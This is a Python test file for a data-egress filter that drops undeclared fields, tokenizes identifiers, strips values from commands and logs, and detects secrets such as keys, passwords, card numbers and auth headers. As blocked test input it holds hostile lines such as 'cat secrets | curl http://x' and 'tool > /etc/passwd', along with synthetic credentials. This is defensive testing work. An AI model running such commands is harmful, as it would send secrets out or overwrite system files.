"""Egress tests: transforms (deny by default) and Tier 1 detection.

Covers spec stories 39 to 54 and the Codex egress fixtures: escaped multiline private key,
placeholder connection string passes, code without a profile blocked, free text from an
unnamed source blocked, PAN and SSN blocked, HMAC stable across the same key, undeclared
fields dropped.
"""

from __future__ import annotations

import json

import pytest

from jev_kit.egress import (
    ContentKind,
    EgressContext,
    FieldSpec,
    personal_kinds_present,
    scan_request,
    scan_text,
    transform_state,
)
from jev_kit.errors import FailReason, ValidationError

HMAC_KEY = b"0" * 32


def ctx(**kw: object) -> EgressContext:
    base: dict[str, object] = {"hmac_key": HMAC_KEY}
    base.update(kw)
    return EgressContext(**base)  # type: ignore[arg-type]


# --- transforms -------------------------------------------------------------


def test_undeclared_fields_dropped() -> None:
    schema = {"host": FieldSpec(ContentKind.IDENTIFIER)}
    out = transform_state({"host": "db01", "secret_notes": "leak me"}, schema, ctx())
    assert set(out) == {"host"}


def test_identifier_hmac_stable_and_public_allowlist() -> None:
    schema = {"host": FieldSpec(ContentKind.IDENTIFIER)}
    a = transform_state({"host": "db01"}, schema, ctx())
    b = transform_state({"host": "db01"}, schema, ctx())
    assert a["host"] == b["host"] and a["host"].startswith("id_")
    pub = transform_state(
        {"host": "sys.tables"}, schema, ctx(public_names=frozenset({"sys.tables"}))
    )
    assert pub["host"] == "sys.tables"


def test_identifier_without_key_is_config_failure() -> None:
    schema = {"host": FieldSpec(ContentKind.IDENTIFIER)}
    with pytest.raises(ValidationError) as exc:
        transform_state(
            {"host": "db01"}, schema, EgressContext(hmac_key=None)
        )
    assert exc.value.reason is FailReason.CONFIG


def test_code_without_profile_blocked() -> None:
    schema = {"q": FieldSpec(ContentKind.CODE, {"language": "sql"})}
    with pytest.raises(ValidationError) as exc:
        transform_state({"q": "select * from t where id = 5"}, schema, ctx())
    assert exc.value.reason is FailReason.EGRESS_BLOCKED


def test_code_with_fixture_profile_normalized() -> None:
    def fake_sql(text: str) -> str:
        import re

        return re.sub(r"\b\d+\b", "?", text)

    schema = {"q": FieldSpec(ContentKind.CODE, {"language": "sql"})}
    out = transform_state(
        {"q": "select * from t where id = 5"},
        schema,
        ctx(language_profiles={"sql": fake_sql}),
    )
    assert "5" not in out["q"] and "?" in out["q"]


def test_free_text_blocked_without_named_source() -> None:
    schema = {"body": FieldSpec(ContentKind.FREE_TEXT, {"source_type": "web"})}
    with pytest.raises(ValidationError):
        transform_state({"body": "hello"}, schema, ctx())  # empty source allowlist


def test_free_text_allowed_from_named_source_masks_contact() -> None:
    schema = {"body": FieldSpec(ContentKind.FREE_TEXT, {"source_type": "web"})}
    out = transform_state(
        {"body": "reach me at a@b.com"},
        schema,
        ctx(source_allowlist=frozenset({"web"})),
    )
    assert "a@b.com" not in out["body"] and "<contact>" in out["body"]


def test_number_in_non_metric_field_blocked() -> None:
    schema = {"host": FieldSpec(ContentKind.IDENTIFIER)}
    with pytest.raises(ValidationError):
        transform_state({"host": 5}, schema, ctx())


def test_metric_passes_number() -> None:
    schema = {"rows": FieldSpec(ContentKind.METRIC)}
    assert transform_state({"rows": 42}, schema, ctx()) == {"rows": 42}


def test_unsafe_object_key_blocked() -> None:
    schema = {"ids": FieldSpec(ContentKind.IDENTIFIER)}
    with pytest.raises(ValidationError):
        transform_state({"ids": {"bad key!": "x"}}, schema, ctx())


def test_keyed_list_transformed() -> None:
    schema = {"ids": FieldSpec(ContentKind.IDENTIFIER)}
    out = transform_state({"ids": {"a": "server1", "b": "server2"}}, schema, ctx())
    assert all(v.startswith("id_") for v in out["ids"].values())


def test_personal_kinds_present() -> None:
    assert personal_kinds_present({"h": FieldSpec(ContentKind.IDENTIFIER)}) is True
    assert personal_kinds_present({"n": FieldSpec(ContentKind.METRIC)}) is False


# --- C04: metric is not a container or arbitrary-string escape ------------


def test_metric_rejects_nested_container() -> None:
    schema = {"m": FieldSpec(ContentKind.METRIC)}
    with pytest.raises(ValidationError) as exc:
        transform_state({"m": {"undeclared": "PRIVATE_SENTINEL"}}, schema, ctx())
    assert exc.value.reason is FailReason.EGRESS_BLOCKED


def test_metric_rejects_nested_list() -> None:
    schema = {"m": FieldSpec(ContentKind.METRIC)}
    with pytest.raises(ValidationError):
        transform_state({"m": ["PRIVATE_SENTINEL"]}, schema, ctx())


def test_metric_rejects_bool() -> None:
    schema = {"m": FieldSpec(ContentKind.METRIC)}
    with pytest.raises(ValidationError):
        transform_state({"m": True}, schema, ctx())


def test_metric_accepts_number_and_safe_token() -> None:
    schema = {"m": FieldSpec(ContentKind.METRIC)}
    assert transform_state({"m": 3.5}, schema, ctx()) == {"m": 3.5}
    assert transform_state({"m": "v1.2.3"}, schema, ctx()) == {"m": "v1.2.3"}


def test_metric_rejects_long_or_unsafe_string() -> None:
    schema = {"m": FieldSpec(ContentKind.METRIC)}
    with pytest.raises(ValidationError):
        transform_state({"m": "a" * 65}, schema, ctx())
    with pytest.raises(ValidationError):
        transform_state({"m": "PRIVATE_SENTINEL;drop"}, schema, ctx())


# --- C05: transforms must not leak values, transcripts need named source ---


def test_reduce_command_strips_flag_values_and_bare_args() -> None:
    schema = {"c": FieldSpec(ContentKind.COMMAND)}
    out = transform_state(
        {"c": "run --tenant=PRIVATE_TENANT --file=/private/person/file extra"},
        schema,
        ctx(),
    )
    assert "PRIVATE_TENANT" not in out["c"]
    assert "/private/person/file" not in out["c"]
    assert out["c"] == "run --tenant --file"


def test_reduce_log_masks_unquoted_key_value_pairs() -> None:
    schema = {"l": FieldSpec(ContentKind.LOG)}
    out = transform_state({"l": "tenant=PRIVATE_TENANT host=internal-db"}, schema, ctx())
    assert "PRIVATE_TENANT" not in out["l"]
    assert "internal-db" not in out["l"]


def test_mask_contacts_masks_ipv6() -> None:
    schema = {"l": FieldSpec(ContentKind.LOG)}
    out = transform_state(
        {"l": "connect to 2001:0db8:0000:0000:0000:ff00:0042:8329 now"}, schema, ctx()
    )
    assert "2001:0db8:0000:0000:0000:ff00:0042:8329" not in out["l"]
    assert "<contact>" in out["l"]


# --- GATE-02: _reduce_command must not leak env, paths, or short-flag values -----


def test_reduce_command_drops_leading_env_assignment() -> None:
    schema = {"c": FieldSpec(ContentKind.COMMAND)}
    out = transform_state({"c": "REVIEW_TOKEN=PRIVATE_VALUE tool"}, schema, ctx())
    assert "PRIVATE_VALUE" not in out["c"]
    assert "REVIEW_TOKEN" not in out["c"]
    assert out["c"] == "tool"


def test_reduce_command_strips_leading_path() -> None:
    schema = {"c": FieldSpec(ContentKind.COMMAND)}
    out = transform_state({"c": "/home/alice/bin/tool --flag"}, schema, ctx())
    assert "/home/alice/bin" not in out["c"]
    assert "alice" not in out["c"]
    assert out["c"] == "tool --flag"


def test_reduce_command_strips_short_flag_attached_value() -> None:
    schema = {"c": FieldSpec(ContentKind.COMMAND)}
    out = transform_state({"c": "tool -pPRIVATE_VALUE"}, schema, ctx())
    assert "PRIVATE_VALUE" not in out["c"]
    assert out["c"] == "tool -p"


def test_reduce_command_combined_leak_vectors() -> None:
    schema = {"c": FieldSpec(ContentKind.COMMAND)}
    out = transform_state(
        {"c": "REVIEW_TOKEN=PRIVATE_VALUE /home/alice/bin/tool -pPRIVATE_VALUE extra"},
        schema,
        ctx(),
    )
    assert "PRIVATE_VALUE" not in out["c"]
    assert "/home/alice/bin" not in out["c"]
    assert "alice" not in out["c"]
    assert out["c"] == "tool -p"


# --- GATE-03: bare identifiers and compressed IPv6 must not leak ----------------


def test_reduce_log_masks_bare_identifier_without_key() -> None:
    schema = {"l": FieldSpec(ContentKind.LOG)}
    out = transform_state({"l": "connecting to internal-db failed"}, schema, ctx())
    assert "internal-db" not in out["l"]


def test_mask_contacts_masks_compressed_ipv6() -> None:
    schema = {"l": FieldSpec(ContentKind.LOG)}
    out = transform_state({"l": "connect to 2001:db8::1234 now"}, schema, ctx())
    assert "2001:db8::1234" not in out["l"]
    assert "<contact>" in out["l"]


def test_mask_contacts_masks_loopback_ipv6() -> None:
    schema = {"l": FieldSpec(ContentKind.LOG)}
    out = transform_state({"l": "bound to ::1 on startup"}, schema, ctx())
    assert "::1" not in out["l"]
    assert "<contact>" in out["l"]


def test_transcript_blocked_when_disabled() -> None:
    schema = {"t": FieldSpec(ContentKind.TRANSCRIPT, {"source_type": "chat"})}
    with pytest.raises(ValidationError) as exc:
        transform_state(
            {"t": "hello"},
            schema,
            ctx(transcript_enabled=False, source_allowlist=frozenset({"chat"})),
        )
    assert exc.value.reason is FailReason.EGRESS_BLOCKED


def test_transcript_blocked_when_source_not_in_allowlist() -> None:
    schema = {"t": FieldSpec(ContentKind.TRANSCRIPT, {"source_type": "chat"})}
    with pytest.raises(ValidationError) as exc:
        transform_state(
            {"t": "hello"},
            schema,
            ctx(transcript_enabled=True),  # empty allowlist
        )
    assert exc.value.reason is FailReason.EGRESS_BLOCKED


def test_transcript_allowed_from_named_source_masks_and_caps() -> None:
    schema = {"t": FieldSpec(ContentKind.TRANSCRIPT, {"source_type": "chat"})}
    out = transform_state(
        {"t": "reach me at a@b.com " + "x" * 3000},
        schema,
        ctx(
            transcript_enabled=True,
            source_allowlist=frozenset({"chat"}),
            transcript_cap=10,
        ),
    )
    assert "a@b.com" not in out["t"]
    assert len(out["t"]) <= 10


# --- detectors --------------------------------------------------------------


def test_private_key_detected_even_escaped_in_json() -> None:
    body = json.dumps(
        {"text": "-----BEGIN PRIVATE KEY-----\nSYNTHETIC\n-----END PRIVATE KEY-----"}
    ).encode("utf-8")
    assert scan_request(body, json.loads(body)) == "private_key"


def test_connection_string_password_detected() -> None:
    assert scan_text("Server=x;User Id=sa;Password=hunter2secret;") == "connection_string_password"


def test_connection_string_placeholder_passes() -> None:
    assert scan_text("Server=x;Password=***;") is None
    assert scan_text("Password=<password>") is None


def test_payment_card_luhn_detected() -> None:
    assert scan_text("card 4111 1111 1111 1111 on file") == "payment_card"


def test_non_luhn_digits_not_flagged_as_card() -> None:
    assert scan_text("order 1234 5678 9012 3456 shipped") != "payment_card"


def test_ssn_detected() -> None:
    assert scan_text("ssn 123-45-6789") == "us_ssn"


def test_jwt_and_aws_and_github_detected() -> None:
    jwt = "eyJhbGciOiJIUzI1NiIsInR5.eyJzdWIiOiIxMjM0NTY3.SflKxwRJSMeKKF2QT4"
    assert scan_text(f"token {jwt}") == "jwt"
    assert scan_text("AKIAIOSFODNN7EXAMPLE") == "aws_key"
    assert scan_text("ghp_" + "a" * 36) == "github_pat"


def test_clean_text_passes() -> None:
    assert scan_text("route this ticket to billing") is None
    assert scan_request(b'{"x":"hello"}', {"x": "hello"}) is None


# --- C06: narrower placeholder rule, single-quoted passwords ----------------


def test_single_quoted_password_detected() -> None:
    assert scan_text("Password='hunter2secret'") == "connection_string_password"


def test_single_quoted_placeholder_passes() -> None:
    assert scan_text("Password='***'") is None
    assert scan_text("Password='<password>'") is None


def test_synthetic_looking_angle_bracket_value_still_detected() -> None:
    # Only the documented redaction literals are placeholders; any other angle-bracket token
    # (even one that looks like a redaction marker) must still be flagged as a real value.
    assert scan_text("Password=<synthetic-review-secret>") == "connection_string_password"


def test_documented_redaction_literals_still_pass() -> None:
    for token in ("<redacted>", "<password>", "<secret>", "<pwd>", "<value>", "<PWD>"):
        assert scan_text(f"Password={token}") is None


# --- C06: credentialed connection URIs --------------------------------------


def test_connection_string_uri_detected() -> None:
    assert (
        scan_text("postgres://appuser:hunter2secret@dbhost.internal/appdb")
        == "connection_string_uri"
    )
    assert (
        scan_text("mysql://appuser:hunter2secret@dbhost.internal/appdb")
        == "connection_string_uri"
    )
    assert (
        scan_text("mongodb+srv://appuser:hunter2secret@cluster0.example.net/appdb")
        == "connection_string_uri"
    )


def test_connection_string_uri_without_credentials_passes() -> None:
    assert scan_text("postgres://dbhost.internal/appdb") is None
    assert scan_text("postgres://appuser@dbhost.internal/appdb") is None


# --- C06: HTTP Basic auth header --------------------------------------------


def test_authorization_basic_header_detected() -> None:
    assert (
        scan_text("Authorization: Basic dXNlcjpwYXNzd29yZA==") == "authorization_header"
    )


def test_authorization_bearer_header_still_detected() -> None:
    assert scan_text("Authorization: Bearer sometoken12345") == "authorization_header"


def test_authorization_other_scheme_not_flagged() -> None:
    assert scan_text("Authorization: Negotiate abc123") is None


# --- C06: payment card track data -------------------------------------------


def test_card_track_data_detected() -> None:
    track = "%B4111111111111111^REVIEW/SAMPLE^29121010000000000000?"
    assert scan_text(track) == "card_track_data"


def test_card_track_data_near_miss_passes() -> None:
    # Too few PAN digits to be track data, and no other rule should fire either.
    assert scan_text("%B123^SHORT^") is None


# --- GATE-04: auth credential split across a JSON key and value -------------


def test_bearer_value_detected_without_authorization_prefix() -> None:
    body = json.dumps({"h": "Authorization", "v": "Bearer aZ9xQ7mK2pL8vN3tR5wJ1cH6"}).encode()
    assert scan_request(body, json.loads(body)) == "authorization_header"


def test_basic_value_detected_without_authorization_prefix() -> None:
    body = json.dumps({"authorization": "Basic aGVsbG8td29ybGQtc2VjcmV0"}).encode()
    assert scan_request(body, json.loads(body)) == "authorization_header"


def test_bearer_word_alone_with_no_token_stays_clean() -> None:
    assert scan_text("Bearer") is None
    assert scan_text("please present your Bearer token at the gate") is None


def test_high_entropy_token_next_to_auth_indicator_key_detected() -> None:
    body = json.dumps({"authorization": "aZ9xQ7mK2pL8vN3tR5wJ1cH6"}).encode()
    assert scan_request(body, json.loads(body)) == "auth_credential"


def test_high_entropy_token_split_across_header_name_value_keys_detected() -> None:
    body = json.dumps({"h": "Authorization", "v": "aZ9xQ7mK2pL8vN3tR5wJ1cH6"}).encode()
    assert scan_request(body, json.loads(body)) == "auth_credential"


def test_auth_indicator_with_short_or_placeholder_value_stays_clean() -> None:
    for value in ("none", "***", "<redacted>", "abc"):
        body = json.dumps({"authorization": value}).encode()
        assert scan_request(body, json.loads(body)) is None


# --- PR #40 hardening: H4, H15, H16, H17 ------------------------------------


def test_identifier_collection_keys_are_tokenized_h4() -> None:
    # A dict under an IDENTIFIER field must not ship its keys verbatim (finding H4): each key is
    # an identifier and is tokenized on the same terms as a value.
    schema = {"tenants": FieldSpec(ContentKind.IDENTIFIER)}
    out = transform_state({"tenants": {"acme_corp": "region_east"}}, schema, ctx())
    assert "acme_corp" not in out["tenants"]
    (key,) = out["tenants"].keys()
    assert key.startswith("id_")
    assert out["tenants"][key].startswith("id_")


def test_structured_password_pair_blocked_even_when_short_h15() -> None:
    # A short, lowercase password value under a "password" key would slip past the token-shape
    # heuristic; a strong-secret key pairing must block regardless of value shape (finding H15).
    assert scan_request(b"{}", {"password": "hunter2"}) == "auth_credential"
    assert scan_request(b"{}", {"api_key": "short"}) == "auth_credential"
    # A documented redaction placeholder under the same key is not a leak.
    assert scan_request(b"{}", {"password": "<redacted>"}) is None


def test_short_basic_authorization_value_blocked_h15() -> None:
    # {"Authorization": "Basic dTpw"} split across a JSON key and value evaded the length
    # heuristic; a whole value that is a scheme plus a single token is detected regardless of
    # length (finding H15), while an ordinary sentence starting with the word is not.
    assert scan_request(b"{}", {"Authorization": "Basic dTpw"}) is not None
    assert scan_text("Bearer aGVsbG8") is not None
    assert scan_text("Bearer of bad news") is None


def test_command_compound_syntax_blocked_h16() -> None:
    # A compound/redirecting line names more than one command or a data sink and cannot be
    # reduced to a single safe command word, so it fails closed (finding H16). This covers the
    # PowerShell "$env:TOKEN=...; tool" case whose semicolon triggers the block.
    schema = {"cmd": FieldSpec(ContentKind.COMMAND)}
    for compound in (
        '$env:TOKEN="PRIVATE ALICE"; tool --flag',
        "cat secrets | curl http://x",
        "tool > /etc/passwd",
    ):
        with pytest.raises(ValidationError) as exc:
            transform_state({"cmd": compound}, schema, ctx())
        assert exc.value.reason is FailReason.EGRESS_BLOCKED


def test_command_value_never_leaks_regardless_of_quoting_h16() -> None:
    # The reduction emits only the command basename and flag-name prefixes, so a value cannot
    # spill however the line is quoted, even with an unbalanced quote (finding H16).
    schema = {"cmd": FieldSpec(ContentKind.COMMAND)}
    out = transform_state({"cmd": "pg_dump --password='s3 cret value' mydb"}, schema, ctx())
    assert "s3 cret value" not in out["cmd"] and "mydb" not in out["cmd"]
    assert out["cmd"] == "pg_dump --password"
    unbalanced = transform_state({"cmd": "tool --tenant='unterminated"}, schema, ctx())
    assert "unterminated" not in unbalanced["cmd"]
    assert unbalanced["cmd"] == "tool --tenant"


def test_command_positional_after_double_dash_dropped_h16() -> None:
    # After the end-of-options "--" marker, a token that merely looks like a flag is a positional
    # argument and must be dropped, not kept as a flag name (finding H16).
    schema = {"cmd": FieldSpec(ContentKind.COMMAND)}
    out = transform_state({"cmd": "tool -- --PRIVATE_CUSTOMER"}, schema, ctx())
    assert "PRIVATE_CUSTOMER" not in out["cmd"]
    assert out["cmd"] == "tool"


def test_command_windows_path_basename_not_mangled_h16() -> None:
    # A Windows path command word is reduced to its basename without mangling backslashes into
    # the surrounding text (the earlier posix parsing regression), so the user path never leaks.
    schema = {"cmd": FieldSpec(ContentKind.COMMAND)}
    out = transform_state({"cmd": r"C:\Users\Alice\tool.exe --flag"}, schema, ctx())
    assert "Alice" not in out["cmd"] and "Users" not in out["cmd"]
    assert out["cmd"] == "tool.exe --flag"


def test_log_free_form_identifiers_masked_h17() -> None:
    # Bare identifiers in a free-form log (hostname, username) are masked; only the level keyword
    # survives, since without a declared template we cannot tell template words from data (H17).
    schema = {"line": FieldSpec(ContentKind.LOG)}
    a = transform_state({"line": "ERROR connected to db01"}, schema, ctx())
    assert "db01" not in a["line"] and a["line"].startswith("ERROR")
    b = transform_state({"line": "ERROR user JaneDoe logged in"}, schema, ctx())
    assert "JaneDoe" not in b["line"] and b["line"].startswith("ERROR")
    c = transform_state({"line": "session xG9fT2ab7Qz1LmNpV4kd started ok"}, schema, ctx())
    assert "xG9fT2ab7Qz1LmNpV4kd" not in c["line"]
